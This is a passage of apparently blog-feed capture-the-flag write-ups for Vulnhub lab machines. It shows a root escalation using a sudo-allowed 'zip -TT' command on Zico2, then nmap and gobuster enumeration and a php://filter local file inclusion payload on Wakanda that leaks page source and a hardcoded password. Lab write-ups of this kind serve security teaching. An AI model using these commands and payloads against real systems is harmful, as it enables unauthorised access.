total 9248
drwxr-xr-x  7 zico zico    4096 Jul 18 15:59 .
drwxr-xr-x  3 root root    4096 Jun  8  2017 ..
-rw-------  1 zico zico     912 Jun 19  2017 .bash_history
-rw-r--r--  1 zico zico     220 Jun  8  2017 .bash_logout
-rw-r--r--  1 zico zico    3486 Jun  8  2017 .bashrc
-rw-rw-r--  1 zico zico  504646 Jun 14  2017 bootstrap.zip
drwx------  2 zico zico    4096 Jul 18 15:59 .cache
drwxrwxr-x 18 zico zico    4096 Jun 19  2017 joomla
-rw-r--r--  1 zico zico     675 Jun  8  2017 .profile
drw-------  2 zico zico    4096 Jun  8  2017 .ssh
drwxrwxr-x  6 zico zico    4096 Aug 19  2016 startbootstrap-business-casual-gh-pages
-rw-rw-r--  1 zico zico      61 Jun 19  2017 to_do.txt
-rw-------  1 zico zico    3509 Jun 19  2017 .viminfo
drwxr-xr-x  5 zico zico    4096 Jun 19  2017 wordpress
-rw-rw-r--  1 zico zico 8901913 Jun 19  2017 wordpress-4.8.zip
-rw-rw-r--  1 zico zico    1194 Jun  8  2017 zico-history.tar.gz&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And after checking what commands user is able to execute with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, both &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; commands are available.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Doing another bit of searching I’ve noticed a cool way to execute commands with &lt;code class=&quot;highlighter-rouge&quot;&gt;tar&lt;/code&gt;. Check it out &lt;a href=&quot;https://www.securusglobal.com/community/2014/05/14/solutions-to-the-sudo-challenge/S&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;zico@zico:~$ sudo zip test.zip to_do.txt -T -TT 'sh -c /bin/bash'
  adding: to_do.txt (deflated 2%)
root@zico:~# cd /root
root@zico:/root# ls -la
total 44
drwx------  4 root root 4096 Jun 19  2017 .
drwxr-xr-x 24 root root 4096 Jun  1  2017 ..
-rw-------  1 root root 5723 Jun 19  2017 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  2 root root 4096 Jun  1  2017 .cache
-rw-r--r--  1 root root   75 Jun 19  2017 flag.txt
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwxr-xr-x  2 root root 4096 Jun  8  2017 .vim
-rw-------  1 root root 5963 Jun 19  2017 .viminfo
root@zico:/root# cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
# 
# Hope you enjoyed! 
# 
# 
#
#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
</description>
        <pubDate>Tue, 14 Aug 2018 02:00:00 +0200</pubDate>
        <link>http://localhost:4000/vulnhub-zico2/</link>
        <guid isPermaLink="true">http://localhost:4000/vulnhub-zico2/</guid>
      </item>
    
      <item>
        <title>Vulnhub.com - Wakanda</title>
        <description>&lt;p&gt;In this post we’re going to walk through an amazing box from Vulnhub called &lt;strong&gt;Wakanda&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.

Intermediate level

Flags: There are three flags (flag1.txt, flag2.txt, root.txt)

    DHCP: Enabled
    IP Address: Automatically assigned

Hint: Follow your intuitions ... and enumerate!

For any questions, feel free to contact me on Twitter: xMagass

Happy Hacking!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@xMagass&quot;&gt;xMagass&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/wakanda-1,251/&quot;&gt;https://www.vulnhub.com/entry/wakanda-1,251/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;

&lt;p&gt;From start we’re going to do an &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# nmap -v -sS -sV -sC -A -T4 -p- 10.0.0.13
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-08 05:22 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:22
Completed NSE at 05:22, 0.00s elapsed
Initiating NSE at 05:22
Completed NSE at 05:22, 0.00s elapsed
Initiating ARP Ping Scan at 05:22
Scanning 10.0.0.13 [1 port]
Completed ARP Ping Scan at 05:22, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:22
Completed Parallel DNS resolution of 1 host. at 05:22, 0.00s elapsed
Initiating SYN Stealth Scan at 05:22
Scanning 10.0.0.13 [65535 ports]
Discovered open port 111/tcp on 10.0.0.13
Discovered open port 80/tcp on 10.0.0.13
Discovered open port 3333/tcp on 10.0.0.13
Discovered open port 38284/tcp on 10.0.0.13
Completed SYN Stealth Scan at 05:23, 5.33s elapsed (65535 total ports)
Initiating Service scan at 05:23
Scanning 4 services on 10.0.0.13
Completed Service scan at 05:23, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.13
NSE: Script scanning 10.0.0.13.
Initiating NSE at 05:23
Completed NSE at 05:23, 0.33s elapsed
Initiating NSE at 05:23
Completed NSE at 05:23, 0.01s elapsed
Nmap scan report for 10.0.0.13
Host is up (0.00073s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Vibranium Market
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38284/tcp  status
|_  100024  1          44089/udp  status
3333/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
38284/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 198.048 days (since Mon Jan 22 03:14:46 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 10.0.0.13

NSE: Script Post-scanning.
Initiating NSE at 05:23
Completed NSE at 05:23, 0.00s elapsed
Initiating NSE at 05:23
Completed NSE at 05:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.42 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can already see 2 interesting services - &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 3333 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80. In the meantime I decide to run a &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan against the web page as I couldn’t find anything useful on my own.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.0.13 -x .php,.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.0.0.13/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
[+] Extensions   : .php,.txt
=====================================================
/index.php (Status: 200)
/fr.php (Status: 200)
/admin (Status: 200)
/shell (Status: 200)
/backup (Status: 200)
/secret (Status: 200)
/secret.txt (Status: 200)
/troll (Status: 200)
/hahaha (Status: 200)
/hohoho (Status: 200)
=====================================================&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can see a whole number of websites, but actually looking at them with &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; shows that most of them are just empty files.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl 10.0.0.13/fr.php
root@kali:~# curl 10.0.0.13/admin
root@kali:~# curl 10.0.0.13/shell
root@kali:~# curl 10.0.0.13/backup
root@kali:~# curl 10.0.0.13/secret
root@kali:~# curl 10.0.0.13/troll
root@kali:~# curl 10.0.0.13/hahaha
root@kali:~# curl 10.0.0.13/hohoho

root@kali:~# curl http://10.0.0.13/secret.txt
Congratulations! 

Nope!I am joking....&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Coming back to the main page, we have a commented out link that will change the language of the content.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.0.13/?lang=fr&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As we know that there is a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;fr.php&lt;/code&gt; we can suspect that the script running behind this page will append &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension to anything we pass with parameter.&lt;/p&gt;

&lt;p&gt;I decided to look for some vulnerabilities for this type of situation and came up with &lt;a href=&quot;https://www.exploit-db.com/docs/english/40992-web-app-penetration-testing---local-file-inclusion-(lfi).pdf&quot;&gt;this paper&lt;/a&gt;. With this, we can leak the source code of the pages.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=fr 
PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJlIGR1IHBsdXMgZ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7


&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;

    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;


    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;

    
    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
  &amp;lt;/head&amp;gt;

  &amp;lt;body class=&quot;text-center&quot;&amp;gt;

    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
          &amp;lt;/nav&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/header&amp;gt;

      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
                  &amp;lt;/p&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
        &amp;lt;/p&amp;gt;
      &amp;lt;/main&amp;gt;

      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/footer&amp;gt;
    &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can decode the source.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo &quot;PD9waHAKCiRtZXNzYWdlPSJQcm9jaGFpbmUgb3V2ZXJ0dXJ3JhbmQgbWFyY2jDqSBkdSB2aWJyYW5pdW0uIExlcyBwcm9kdWl0cyB2aWVubmVudCBkaXJlY3RlbWVudCBkdSB3YWthbmRhLiBSZXN0ZXogw6AgbCfDqWNvdXRlISI7&quot; | base64 -d
&amp;lt;?php

$message=&quot;Prochaine ouverture du plus grand marché du vibranium. Les produits viennent directement du wakanda. Restez à l'écoute!&quot;;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hey, that’s the message showing up when we change the language! We can do the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# curl http://10.0.0.13/?lang=php://filter/convert.base64-encode/resource=index
PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=


&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;

    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;


    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;

    
    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
  &amp;lt;/head&amp;gt;

  &amp;lt;body class=&quot;text-center&quot;&amp;gt;

    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
            &amp;lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&amp;gt;Home&amp;lt;/a&amp;gt;
            &amp;lt;!-- &amp;lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&amp;gt;Fr/a&amp;gt; --&amp;gt;
          &amp;lt;/nav&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/header&amp;gt;

      &amp;lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&amp;gt;
        &amp;lt;h1 class=&quot;cover-heading&quot;&amp;gt;Coming soon&amp;lt;/h1&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
                  &amp;lt;/p&amp;gt;
        &amp;lt;p class=&quot;lead&quot;&amp;gt;
          &amp;lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&amp;gt;Learn more&amp;lt;/a&amp;gt;
        &amp;lt;/p&amp;gt;
      &amp;lt;/main&amp;gt;

      &amp;lt;footer class=&quot;mastfoot mt-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;p&amp;gt;Made by&amp;lt;a href=&quot;#&quot;&amp;gt;@mamadou&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
        &amp;lt;/div&amp;gt;
      &amp;lt;/footer&amp;gt;
    &amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And decode the source.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# echo &quot;PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISESB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4=
&amp;gt; &quot; | base64 -d

&amp;lt;?php
$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember it

if (isset($_GET['lang']))
{
include($_GET['lang'].&quot;.php&quot;);
}

?&amp;gt;



&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;
&amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&amp;gt;
    &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;
    &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&amp;gt;
    &amp;lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&amp;gt;
    &amp;lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&amp;gt;

    &amp;lt;title&amp;gt;Vibranium Market&amp;lt;/title&amp;gt;


    &amp;lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&amp;gt;

    
    &amp;lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&amp;gt;
  &amp;lt;/head&amp;gt;

  &amp;lt;body class=&quot;text-center&quot;&amp;gt;

    &amp;lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&amp;gt;
      &amp;lt;header class=&quot;masthead mb-auto&quot;&amp;gt;
        &amp;lt;div class=&quot;inner&quot;&amp;gt;
          &amp;lt;h3 class=&quot;masthead-brand&quot;&amp;gt;Vibranium Market&amp;lt;/h3&amp;gt;
          &amp;lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&amp;gt;
